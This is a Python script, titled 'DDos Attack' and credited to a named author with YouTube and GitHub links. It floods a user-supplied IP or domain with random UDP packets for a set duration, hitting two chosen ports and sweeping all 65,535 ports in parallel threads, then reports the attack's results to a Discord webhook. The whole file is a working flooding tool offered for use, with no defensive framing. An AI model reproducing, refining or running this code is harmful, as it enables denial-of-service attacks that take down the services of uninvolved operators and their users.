import sys
import os
import socket
import random
import threading
import time
import requests
from datetime import datetime

# Get current time
now = datetime.now()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clear the console
os.system("cls" if os.name == "nt" else "clear")
os.system("figlet DDos Attack")
print()
print("Author : GoT Heartless")
print("You Tube : https://youtube.com/@got-heartless?si=zH2AiLu88XbvGVyU")
print("GitHub : https://github.com/GoTHeartless")
print()

target = input("Enter IP Address or Domain Name: ")
port1 = input("First Port : ")
port2 = input("Second Port : ")

# Convert ports to integers
try:
    port1 = int(port1)
    port2 = int(port2)
except ValueError:
    print("Ports must be integers.")
    sys.exit(1)

# Resolve domain name to IP address if necessary
try:
    ip = socket.gethostbyname(target)
except socket.gaierror:
    print("Invalid IP address or domain name.")
    sys.exit(1)

# Get duration from user
duration = input("Duration (in seconds): ")

# Convert duration to integer
try:
    duration = int(duration)
except ValueError:
    print("Duration must be an integer.")
    sys.exit(1)

os.system("cls" if os.name == "nt" else "clear")
os.system("figlet Attack Starting")
print("[ ] 0% ")
print("[===== ] 25%")
print("[========== ] 50%")
print("[=============== ] 75%")
print("[====================] 100%")
print("Attack starting...")

sent1 = 0
sent2 = 0
sent_all = 0
start_time = time.time()  # Record the start time
end_time = start_time + duration  # Calculate the end time

def attack(port):
    global sent1, sent2
    while time.time() < end_time:
        sock.sendto(bytes, (ip, port))
        if port == port1:
            sent1 += 1
        elif port == port2:
            sent2 += 1

def attack_all_ports():
    global sent_all
    for port in range(1, 65536):  # Loop through all UDP ports
        if time.time() >= end_time:
            break
        sock.sendto(bytes, (ip, port))
        sent_all += 1

# Create threads for each port and one for all ports
thread1 = threading.Thread(target=attack, args=(port1,))
thread2 = threading.Thread(target=attack, args=(port2,))
thread_all_ports = threading.Thread(target=attack_all_ports)

# Start the threads
thread1.start()
thread2.start()
thread_all_ports.start()

# Periodically print the number of packets sent
try:
    while time.time() < end_time:
        print(f"Packets sent to port {port1}: {sent1}, Packets sent to port {port2}: {sent2}, Total packets sent to all ports: {sent_all}", end='\r')
        time.sleep(1)  # Update every second

except KeyboardInterrupt:
    print("\nAttack interrupted by user.")

finally:
    # Send notification to Discord webhook
    webhook_url = 'YOUR_WEBHOOK_URL'  # Replace with your Discord webhook URL
    message = {
        "content": (
            f"Attack completed!\n"
            f"Target: {target} ({ip})\n"
            f"Total packets sent to port {port1}: {sent1}\n"
            f"Total packets sent to port {port2}: {sent2}\n"
            f"Total packets sent to all UDP ports: {sent_all}\n"
            f"Duration: {duration} seconds"
        )
    }
    response = requests.post(webhook_url, json=message)
    if response.status_code == 204:
        print("Notification sent to Discord successfully.")
    else:
        print(f"Failed to send notification. Status code: {response.status_code}")

# Wait for all threads to finish
thread1.join()
thread2.join()
thread_all_ports.join()

print("Attack completed.")
print("Total packets sent to port %s: ")
